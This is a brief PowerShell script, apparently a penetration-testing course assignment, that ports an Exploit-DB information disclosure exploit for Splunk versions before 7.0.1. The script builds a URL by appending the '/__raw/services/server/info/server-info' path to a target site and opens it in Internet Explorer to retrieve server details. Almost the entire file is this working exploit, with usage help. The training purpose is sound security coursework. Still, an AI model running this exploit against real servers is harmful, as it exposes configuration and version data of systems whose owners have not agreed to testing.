Function Exploit-1{
    
<#
.SYNOPSIS
this script is designed to apply an Exploit from Exploit-DB

.DESCRIPTION
this script is an Exploit(Splunk < 7.0.1 - Information Disclosure) ported from from Exploit-DB : (https://www.exploit-db.com/exploits/44865) using  IE window.

.PARAMETER URL
The URL of the targeted website.

.EXAMPLE
PS C:\> Exploit-1 -URL "http://www.test.com"

.LINK
https://pfpt3223.wordpress.com/2018/12/28/assignment-5/

.NOTES
This script was created for completing the requirements of the SecurityTube PowerShell for Penetration Testers (PFPT)
Student ID: PSP-3223
#>



   
 
param ([parameter (Mandatory = $true)][string]$URL)

#exploit
$exploit = "/__raw/services/server/info/server-info?output_mode=json"

#set the full URL with Exploit 
$infected_website_URL = $URL + $exploit

#EXPLOITING

# open IE window navigating to the infected URL page 
write-host $infected_website_URL -ForegroundColor Yellow
$IE=new-object -com internetexplorer.application
$IE.navigate2($infected_website_URL)
$IE.visible=$true



}